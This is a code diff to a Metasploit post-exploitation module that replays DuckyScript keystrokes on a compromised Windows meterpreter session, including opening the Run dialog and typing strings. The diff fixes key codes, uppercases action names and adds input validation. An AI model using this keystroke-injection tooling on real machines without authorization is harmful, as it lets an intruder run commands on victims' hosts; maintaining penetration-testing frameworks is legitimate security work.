@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Post
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK, SCREEN_EFFECTS]
+          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK, SCREEN_EFFECTS, PHYSICAL_EFFECTS, AUDIO_EFFECTS]
         },
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter', ],
@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Post
     # Define common key codes for initial testing; this can be expanded later
     # https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.keys?view=windowsdesktop-7.0
     # Keycode => Key Format
-    key_codes = { '8' => 'BACKSPACE', '9' => 'TAB', '10' => 'SHIFT', '11' => 'CONTROL', '13' => 'RETURN',
+    key_codes = { '8' => 'BACKSPACE', '9' => 'TAB', '16' => 'SHIFT', '11' => 'CONTROL', '13' => 'RETURN',
                   '18' => 'MENU', '20' => 'CAPSLOCK', '32' => 'SPACE', '37' => 'LEFT', '38' => 'UP',
                   '27' => 'ESCAPE', '39' => 'RIGHT', '40' => 'DOWN', '33' => 'PAGEUP', '34' => 'PAGEDOWN',
                   '35' => 'END', '36' => 'HOME', '42' => 'PRINTSCREEN', '46' => 'DELETE', '47' => 'HELP',
@@ -72,25 +72,27 @@ class MetasploitModule < Msf::Post
                   '54' => '6', '55' => '7', '56' => '8', '57' => '9'
                 }
     # Define keypress actions
-    actions = { '0' => 'press', '1' => 'down', '2' => 'up' }
+    actions = { '0' => 'PRESS', '1' => 'DOWN', '2' => 'UP' }
     # Parse DuckyScript comments
     if line.starts_with?('REM ')
       return
     end
     # Cursor movement 
-    # Althought this is a bit hacky
+    # Although this is a bit hacky
     cursor_line = line.strip
-    if ( cursor_line.eql?('UP') || cursor_line.eql?('DOWN') || cursor_line.eql?('LEFT') || cursor_line.eql?('RIGHT') || cursor_line.eql?('BACKSPACE') ||
-      cursor_line.eql?('TAB') || cursor_line.eql?('PAGEUP') || cursor_line.eql?('PAGEDOWN') || cursor_line.eql?('HOME') ||
-      cursor_line.eql?('END') || cursor_line.eql?('SPACE') )
-      session.ui.keyevent_send(key_codes.key(cursor_line).to_i, actions.key('press').to_i)
+    if (cursor_line.starts_with?('UP') || cursor_line.starts_with?('DOWN') || cursor_line.starts_with?('LEFT') ||
+      cursor_line.starts_with?('RIGHT') || cursor_line.starts_with?('BACKSPACE') ||
+      cursor_line.starts_with?('TAB') || cursor_line.starts_with?('PAGEUP') || cursor_line.starts_with?('PAGEDOWN') ||
+      cursor_line.starts_with?('HOME') || cursor_line.starts_with?('END') || cursor_line.starts_with?('SPACE') ||
+      cursor_line.starts_with?('RETURN'))
+      session.ui.keyevent_send(key_codes.key(cursor_line).to_i, actions.key('PRESS').to_i)
     end
     if line.include?('STRING') || line.include?('STRINGLN') || line.include?('GUI')
       line_array = line.split(' ', 2)
       # Write a string and press ENTER
       if line_array[0] == 'STRINGLN'
         session.ui.keyboard_send(line_array[1])
-        session.ui.keyevent_send(key_codes.key('RETURN').to_i, actions.key('press').to_i)
+        session.ui.keyevent_send(key_codes.key('RETURN').to_i, actions.key('PRESS').to_i)
       end
       # Write a string
       if line_array[0] == 'STRING'
@@ -98,21 +100,24 @@ class MetasploitModule < Msf::Post
       end
       # Press Windows + R to launch run dialog
       if line_array[0] == 'GUI'
-        session.ui.keyevent_send(key_codes.key('WINLEFT').to_i, actions.key('down').to_i)
-        session.ui.keyevent_send(key_codes.key('R').to_i, actions.key('press').to_i)
-        session.ui.keyevent_send(key_codes.key('WINLEFT').to_i, actions.key('up').to_i)
+        session.ui.keyevent_send(key_codes.key('WINLEFT').to_i, actions.key('DOWN').to_i)
+        session.ui.keyevent_send(key_codes.key('R').to_i, actions.key('PRESS').to_i)
+        session.ui.keyevent_send(key_codes.key('WINLEFT').to_i, actions.key('UP').to_i)
       end
     end
     if line.include?('KEYEVENT')
       line_array = line.split(' ')
-      # Parse raw keyevents; example format, KEYEVENT 82 press
+      # Parse raw keyevents; example format, "KEYEVENT R PRESS"
       if line_array[0] == 'KEYEVENT'
-        session.ui.keyevent_send(line_array[1].to_i, actions.key(line_array[2]).to_i)
+        # error handling: ensure that all values are valid before proceeding.
+        if (key_codes.value?(line_array[1].upcase) && actions.value?(line_array[2].upcase))
+          session.ui.keyevent_send(key_codes.key(line_array[1].upcase).to_i, actions.key(line_array[2].upcase).to_i)
+        end
       end
     end
     # Parse F Keys
     if line.starts_with?('F')
-      session.ui.keyevent_send(key_codes.key(line).to_i, actions.key('press').to_i)
+      session.ui.keyevent_send(key_codes.key(line).to_i, actions.key('PRESS').to_i)
     end
   end
 
@@ -124,8 +129,6 @@ class MetasploitModule < Msf::Post
     end
     print_good("Reading file #{datastore['FILENAME']}")
     File.readlines(datastore['FILENAME']).each do |line|
-      # Parse out blank lines
-      line.split(/\r?\n/)
       next if line.blank?
       if datastore['VERBOSE']
         print_good("Line: #{line}")
